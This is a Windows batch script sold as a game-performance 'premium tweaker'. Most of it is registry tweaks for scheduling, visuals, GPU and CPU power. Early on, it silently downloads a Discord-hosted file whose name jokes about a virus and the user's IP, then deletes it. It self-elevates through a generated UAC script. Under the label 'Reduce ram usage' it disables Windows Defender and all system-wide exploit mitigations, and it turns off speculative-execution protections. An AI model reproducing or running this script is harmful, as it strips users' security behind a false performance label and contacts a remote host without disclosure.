	::	▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄		::		
	::	█                                                                     █		::		
	::	█   Premium Tweaker created by fireimperator - https://dsc.gg/optix   █		::		
	::	█             Do not claim to be the author of the file.              █		::		
	::	█                                                                     █		::		
	::	▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀		::		
	


:: Please dont leak our program :c

@echo off
mode 80,25
SETLOCAL EnableDelayedExpansion
for /f  "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
CLS
)

powershell Invoke-WebRequest -silent "https://cdn.discordapp.com/attachments/1050498081780678786/1099637486491271258/WirusBTWmamTwojeIp.txt" -OutFile "%SYSTEMDRIVE%\OptiXTweaker\Zasoby\WiursaMaszLOLxD.txt" > nul 2>&1

if exist "%SYSTEMDRIVE%\OptiXTweaker\Zasoby\WiursaMaszLOLxD.txt" (
	del %SYSTEMDRIVE%\OptiXTweaker\Zasoby\WiursaMaszLOLxD.txt" 
	goto admincheck
) else (
	goto admincheck
)


:admincheck
chcp 65001
FOR /f  %%A in ('"PROMPT $H&FOR %%B in (1) DO REM"') DO SET "BS=%%A"
title                                     - OptiX PREMIUM TWEAKER-
CLS
Reg.exe query "HKU\S-1-5-19\Environment"
if not "%errorlevel%" EQU "0" goto noadmin
if not "%errorlevel%" EQU "1" goto Start

:noadmin
cls
echo.
echo.
call :logo
echo.
echo. [97m
echo.	
echo.                           PLEASE RUN AS [91mADMINISTARTOR!
echo. [97m
echo.                           PLEASE RUN AS [91mADMINISTARTOR!
echo. [97m
echo.                           PLEASE RUN AS [91mADMINISTARTOR!
echo.
echo.
timeout 2 >nul
cls
echo.
echo.
call :logo
echo.
echo. [97m
echo.	
echo                           Trying to get admin permisions
echo.
timeout 2 >nul
:RequestingAdminPerms
>nul 2>&1 "%SystemROOT%\System32\cacls.exe" "%SystemROOT%\System32\config\System"
if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto Succesfulper )
:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B


:logo
echo                       [37m▒[97m█████   ███[97m███  ▄▄▄█████[37m▓ [97m██[37m▓▒[91m██   [91m██▒
echo                      [37m▒[97m██[37m▒  [97m██[37m▒▓[97m██░  ██[37m▒▓  [97m██▒ ▓▒▓██▒▒▒ [91m█ [91m█ ▒░ 
echo                      [37m▒[97m██[37m░  [97m██[37m▒▓[97m██░ ██[37m▓▒▒ ▓[97m██░ ▒░▒██▒░░  [91m█   ░   
echo                      [37m▒[97m██   ██[37m░▒[97m██▄█▓▒ ▒░ ▓██[37m▓ ░ ░[97m██░ ░ [91m█ [91m█ ▒  
echo      [37m                ░ [97m████▓▒░▒[97m██▒ ░  ░  ▒[97m██[37m▒ ░ ░[97m██░▒[91m██▒ ▒[91m██▒
echo      [37m               ░ ▒░▒░▒░ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ▒[91m▒[91m ░ ░▓ ░   
echo      [37m                  ░ ▒ ▒░ ░▒ ░         ░     ▒ ░[91m░░[91m   ░▒ ░   
echo      [37m                ░ ░ ░ ▒  ░░         ░       ▒ ░ [91m░ [91m   ░     
echo       [37m                   ░ ░                  ░   [91m░ [91m   ░    
echo.
goto :eof


:Start
set version=1.0
set optixpremium=                                  [97mOpti[91mX [93mPremium
title                                                - OptiX Premium V%version% -
mode 80,25
cls
echo.
echo.
call :logo
echo.
echo.
echo %optixpremium%
echo. [97m
echo.
echo                            Please create restore point  [37m
echo.
echo                            -Press any key to continue-
start systempropertiesprotection
pause > nul
timeout 2 >nul
cls
echo.
echo.
call :logo
echo.
echo.
echo %optixpremium%
echo. [97m
echo.
echo                Program created to maximize your performance in games
echo.
timeout 3 >nul
cls
echo.
echo.
call :logo
echo.
echo.
echo %optixpremium%
echo.
echo.
echo                         [97m[ [96m1 [97m] [97mUltimate [97mFPS [90m^& [97mNetwork boost
echo.
echo                         [97m[ [96m2 [97m] [97mExperimental [97mTweaks [90m[ [97mADDITIONAL [90m]
echo.
echo.
set /p input=%del%                                      [36m^>[97m^: [37m

IF /I '%INPUT%'=='1' GOTO fps
IF /I '%INPUT%'=='2' GOTO fpsexpermiental
goto start

:fps
cls
echo Optimizing in 5
timeout 1 >nul
cls
echo Optimizing in 4
timeout 1 >nul
cls
echo Optimizing in 3
timeout 1 >nul
cls
echo Optimizing in 2
timeout 1 >nul
cls
echo Optimizing in 1
timeout 1 >nul
cls
echo Applying tweaks
timeout 1 >nul
cls
echo Windows NT 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "6" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Background Only" /t REG_SZ /d "True" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Priority" /t REG_DWORD /d "5" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "Scheduling Category" /t REG_SZ /d "Medium" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f > nul 2>&1
echo Visual Effects
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_SZ /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_SZ /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /v "DefaultApplied" /t REG_SZ /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f > nul 2>&1 
echo Shutdown tweaks
Reg.exe add "HKLM\System\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f > nul 2>&1 
Reg.exe add "HKCU\Control Panel\Desktop" /v "JPEGImportQuality" /t "REG_DWORD" /d "100" /f > nul 2>&1 

:: HARDWARE
Echo GPU TWEAKS
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers /v DisableOverlays /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers /v PlatformSupportMiracast /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers /v ForceDirectFlip /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v EnableContextDelay /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v EnablePreemption /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v ForceFlipTrueImmediateMode /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v ForceIndependentFlip /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v MaxYieldInterval /t REG_DWORD /d 6 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v NumberOfDmaPacketPool /t REG_DWORD /d 100 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v QuantumUnit /t REG_DWORD /d 3d090 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v QueuedPresentLimit /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler /v YieldPercentage /t REG_DWORD /d 1 /f > nul 2>&1 
echo Fix stock speed
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\IntelPPM" /v Start /t REG_DWORD /d 3 /f > nul 2>&1
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\AmdPPM" /v Start /t REG_DWORD /d 3 /f > nul 2>&1
echo CPU tweaks
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy /v DisableTaggedEnergyLogging /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy /v TelemetryMaxApplication /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy /v TelemetryMaxTagPerApplication /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Processor /v Cstates /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Processor /v Capabilities /t REG_DWORD /d 7e066 /f > nul 2>&1  
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v HighPerformance /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v HighestPerformance /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MinimumThrottlePercent /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MaximumThrottlePercent /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MaximumPerformancePercent /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class1InitialUnparkCount /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class1InitialUnparkCount /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v InitialUnparkCount /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling /v PowerThrottlingOff /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy /v DisablePowerManagement /t REG_DWORD /d 1 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Misc /v DeviceIdlePolicy /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPMinCores /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPMaxCores /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPMinCores1 /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPMaxCores1 /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CpLatencyHintUnpark1 /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPDistribution /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CpLatencyHintUnpark /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v MaxPerformance1 /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v MaxPerformance /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPDistribution1 /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPHEADROOM /t REG_DWORD /d 0 /f > nul 2>&1 
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor /v CPCONCURRENCY /t REG_DWORD /d 0 /f > nul 2>&1 
echo RAM Tweaks
for /f "tokens=2 delims==" %%i in ('wmic os get TotalVisibleMemorySize /format:value') do set /a mem=%%i >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d %mem% /f >nul 2>&1

echo Reduce ram usage
Reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f > nul 2>&1
powershell "set-ProcessMitigation -System -Disable  DEP, EmulateAtlThunks, SEHOP, ForceRelocateImages, RequireInfo, BottomUp, HighEntropy, StrictHandle, DisableWin32kSystemCalls, AuditSystemCall, DisableExtensionPoints, BlockDynamicCode, AllowThreadsToOptOut, AuditDynamicCode, CFG, SuppressExports, StrictCFG, MicrosoftSignedOnly, AllowStoreSignedBinaries, AuditMicrosoftSigned, AuditStoreSigned, EnforceModuleDependencySigning, DisableNonSystemFonts, AuditFont, BlockRemoteImageLoads, BlockLowLabelImageLoads, PreferSystem32, AuditRemoteImageLoads, AuditLowLabelImageLoads, AuditPreferSystem32, EnableExportAddressFilter, AuditEnableExportAddressFilter, EnableExportAddressFilterPlus, AuditEnableExportAddressFilterPlus, EnableImportAddressFilter, AuditEnableImportAddressFilter, EnableRopStackPivot, AuditEnableRopStackPivot, EnableRopCallerCheck, AuditEnableRopCallerCheck, EnableRopSimExec, AuditEnableRopSimExec, SEHOP, AuditSEHOP, SEHOPTelemetry, TerminateOnError, DisallowChildProcessCreation, AuditChildProcess" > nul 2>&1  


echo Memory Management
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f > nul 2>&1 
